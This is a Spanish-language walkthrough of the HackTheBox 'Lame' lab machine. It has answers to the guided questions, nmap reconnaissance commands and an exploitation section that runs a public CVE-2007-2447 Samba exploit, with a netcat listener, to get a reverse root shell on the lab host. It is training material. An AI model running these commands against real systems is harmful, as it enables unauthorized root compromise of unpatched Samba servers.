1)¿Cuántos de los 1000 puertos TCP principales de nmap están abiertos en el host remoto?
	4
	*Puertos:* 21,22,139,445
	Esto lo vimos con el comando `nmap --top-ports 1000 --open -sS -vvv -n -Pn 10.10.10.3 -oG allPorts` (le saque el `--min-rate 5000` por que no me aparecian todos los puertos)

2)¿Qué versión de VSFTPd se está ejecutando en Lame?
	2.3.4

3)Hay un famoso backdoor en VSFTPd versión 2.3.4, y un módulo Metasploit para explotarlo. ¿Funciona ese exploit aquí?
	No

4)¿Qué versión de Samba se está ejecutando en Lame? Indique los números hasta "-Debian" pero sin incluirlo.
	3.0.20

5)¿Qué CVE de 2007 permite la ejecución remota de código en esta versión de Samba a través de metacaracteres de shell que implican la función SamrChangePassword cuando la opción «username map script» está habilitada en smb.conf?
	CVE-2007-2447

6)La explotación de CVE-2007-2447 devuelve un intérprete de comandos como ¿qué usuario?
	root

*Las dos preguntas anteriores eran las flags*. Las siguientes preguntas son adicionales

9)Exploraremos un poco más allá de conseguir un shell root en la caja. Mientras que la escritura oficial no cubre esto, puedes mirar la escritura de 0xdf para más detalles. Con una shell de root, podemos ver por qué falló el exploit VSFTPd. Nuestro escaneo nmap inicial mostró cuatro puertos TCP abiertos. Ejecutando netstat -tnlp muestra muchos más puertos escuchando, incluyendo algunos en 0.0.0.0 y la IP externa de la caja, por lo que deberían ser accesibles. ¿Qué debe estar bloqueando la conexión a estos puertos?
	firewall

10)Cuando se activa el backdoor VSFTPd, ¿qué puerto empieza a escuchar?
	6200

11)Cuando se activa el backdoor VSFTPd, ¿el puerto 6200 empieza a escuchar en Lame?
	yes

##### Las preguntas adicionales por lo que entiendo segun el [writeup de 0xdf que nos da htb](https://0xdf.gitlab.io/2020/04/07/htb-lame.html#beyond-root---vsftpd) dice que si no estamos como root el firewall nos bloquea la mayoria de los puertos


-----------
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.10.10.3
nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.10.3 -oG allPorts
extractPorts allPorts
nmap -sCV -p21,22,139,445,3632 10.10.10.3 -oN target
```

![[Lame1.png]]
![[Lame2.png]]

![[Lame3.png]]
![[Lame4.png]]
*TTL:* Maquina Linux
*Puertos:*
`21` FTP
`22` SSH
`445` SMB

-------
# Escaneo con [[NMAP Scripts]]

```
nmap --script="smb-vuln*" -p445 10.10.10.3 -oN smbScan
```

![[Lame5.png]]
No nos aporta ninguna informacion relevante

-------
# Explotacion [[CVE-2007-2447]]

#### No encontramos una enumeracion valida para este exploit, ya que nmap no enumera este cve, y haciendo pruebas con otros comandos tampoco pudimos

[Exploit hecho por amriunix](https://github.com/amriunix/CVE-2007-2447)(Para python2.7)

Clonamos el repositorio en nuestra maquina ``git clone https://github.com/amriunix/CVE-2007-2447.git``
Instalamos la libreria pysmb con el comando ``pip install pysmb``

Entramos a la carpeta del repositorio y solamente nos falta ejecutar el exploit mientras estamos en escucha con [[nc -nlvp 443]]
```
python2.7 usermap_script.py IpMaquinaVictima PuertoMaquinVictima IpDeNuestraMaquina PuertoDeNuestraMaquina
python2.7 usermap_script.py 10.10.10.3 445 10.10.16.10 443
```
![[Lame10.png]]

Una vez ejecutado el exploit ya estamos adentro como *root*
#### Hacemos un [[Tratamiento de la TTY]]

y nada mas nos queda catear las flags para terminar la maquina
![[Lame8.png]]